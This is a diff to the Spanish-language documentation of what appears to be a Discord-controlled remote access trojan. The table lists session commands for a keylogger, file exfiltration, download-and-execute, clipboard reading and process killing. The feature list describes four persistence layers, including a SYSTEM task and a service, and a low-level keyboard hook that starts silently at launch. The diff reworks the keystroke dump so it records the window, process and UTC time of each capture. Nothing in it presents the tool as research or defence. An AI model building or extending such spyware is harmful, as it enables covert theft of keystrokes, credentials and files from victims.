@@ -54,7 +54,8 @@ Se ejecutan en el canal de sesión del equipo. El panel publica además quince b
 | `/ps kill <pid>` | Mata el proceso y sus hijos. | Quitar lo que estorba. |
 | `/keylog start` | Reengancha el keylogger si lo detuviste. | Captura activa sin reiniciar. |
 | `/keylog stop` | Lo detiene hasta el próximo arranque. | Cortar la captura en caliente. |
-| `/keylog dump` | Publica lo capturado desde el último dump. | Extraer el log, sin pasar por start. |
+| `/keylog dump` | Publica el .txt agrupado por ventana, con proceso y hora UTC. | Leer qué se escribió y dónde. |
+| `/keylog clear` | Vacía el buffer en memoria. | Empezar un registro limpio. |
 | `/download <ruta>` | Sube un archivo o carpeta comprimida. | Sacar lo que interesa. |
 | `/upload <url>` | Descarga y opcionalmente ejecuta. | Meter una herramienta. |
 | `/clip get` | Lee el portapapeles. | Recuperar lo último copiado. |
@@ -77,7 +78,7 @@ Se ejecutan en el canal de sesión del equipo. El panel publica además quince b
 - **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
 - **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
 - **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
-- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Escribe en lote a `ProgramData`, sobrevive reinicios y `/keylog dump` entrega solo lo nuevo.
+- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Cada ventana abre su propio bloque con hora UTC, proceso y título; el dump sale como `.txt` con las teclas especiales inline (`[ENTER]`, `[CTRL+C]`, `[VK:0xNN]`).
 - **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
 - **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.
 
